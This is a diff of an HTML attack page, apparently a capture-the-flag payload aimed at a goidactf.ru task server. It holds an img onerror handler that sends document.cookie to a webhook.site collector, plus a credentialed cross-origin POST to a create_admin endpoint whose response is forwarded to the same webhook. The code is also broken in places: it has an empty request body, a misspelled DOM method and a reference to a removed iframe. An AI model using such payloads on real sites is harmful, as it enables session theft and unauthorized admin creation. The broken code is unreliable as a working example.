@@ -2,27 +2,28 @@
 <html>
                 <body>
 
-                    <iframe  name="frame" src="https://tasks.goidactf.ru:20055/admin"></iframe>
-
                     <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
-                    <img src=x onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
+                    <img src="x" onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
          
 <script>
    const iframe = document.getElementsByName('frame')[0];
 const doc = iframe.contentWindow.document;
 const input = doc.getElementById("LoginInput");
 input.value = "test";
-
-doc.getElementByTagName("button")[0].click();
-fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie,
+const res = await fetch('https://tasks.goidactf.ru:20079/create_admin',
 {
-    method:'GET',
+    method:'POST',
     headers:{
-        'Access-Control-Allow-Origin':'*'
+        'Access-Control-Allow-Origin':'*',
+        'Content-Type': 'application/x-www-form-urlencoded'
         },
     credentials:'include',
-    mode:'no-cors'
-}).then(r=>r.text()).then(d=>console.log(d))</script>
+    mode:'no-cors',
+    body:
+})
+const text = await res.text();
+doc.getElementByTagName("button")[0].click();
+fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+text).then(r=>r.text()).then(d=>console.log(d))</script>
 
 
                 </body>
